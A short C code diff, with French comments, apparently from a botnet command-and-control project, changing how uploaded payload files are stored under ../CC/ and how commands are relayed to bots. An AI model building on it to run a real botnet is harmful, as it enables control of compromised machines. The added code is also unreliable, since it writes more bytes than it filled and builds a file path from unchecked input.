@@ -51,8 +51,6 @@ void send_data(const char *cmd, const char *filename, const char *id_bot)
 {
     void *mem_adr;
     getShm(KEY_DATA, SIZE, &mem_adr);
-    char to_write[30];
-    //to_write = "1,example.so,bot123"
     sprintf((char *)mem_adr, "%s,%s,%s", cmd, filename, id_bot);
     //Envoie un signal au CC
     char line[50];
@@ -292,17 +290,28 @@ void gestionClientWeb(void *s)
         sprintf(filename, "../CC/%s", Charge);
         printf("apres sprintf\n");
 
+        char vraie_donnee[content_length];
+        int a = 0;
+        int j=0;
+        for (int i = 0; i<content_length; i++){
+            if (donnees[i] == 'E') {
+                a = 1;
+            }
+            if(a) {
+                vraie_donnee[j] = donnees[i];
+                j++;
+            }
+            if(donnees[i] == '-') {
+                a = 0;
+            }
+        }
+
         //création et mise en place du fichier dans le CC
         FILE* fichier = fopen(filename, "w");
  
         if (fichier != NULL)
         {
-            fputs(donnees, fichier);
-            /*for (int i = 0; i < content_length; i++)
-            {
-                printf("j'ecrisiiiiiii\n");
-                fputc(donnees[i], fichier);
-            } */   
+            fwrite(vraie_donnee, sizeof(char), content_length, fichier);
             fclose(fichier);
         }
         //envoi de la commande d'installation
